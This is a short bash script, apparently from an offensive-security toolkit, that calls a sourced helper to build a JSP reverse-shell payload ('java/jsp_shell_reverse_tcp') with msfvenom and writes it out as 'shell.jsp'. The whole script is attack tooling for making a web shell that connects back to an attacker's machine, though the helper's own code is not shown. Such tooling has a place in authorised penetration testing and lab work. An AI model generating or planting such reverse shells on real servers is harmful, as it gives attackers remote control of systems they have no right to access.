#!/bin/bash

: '
Create JSP file
'

source "${SCRIPTS_DIR}/shell/msfvenom/.files/create_reverse_shell.sh"

payload="java/jsp_shell_reverse_tcp"
format="raw"
filename="shell.jsp"

create_reverse_shell "${payload}" "${format}" "${filename}"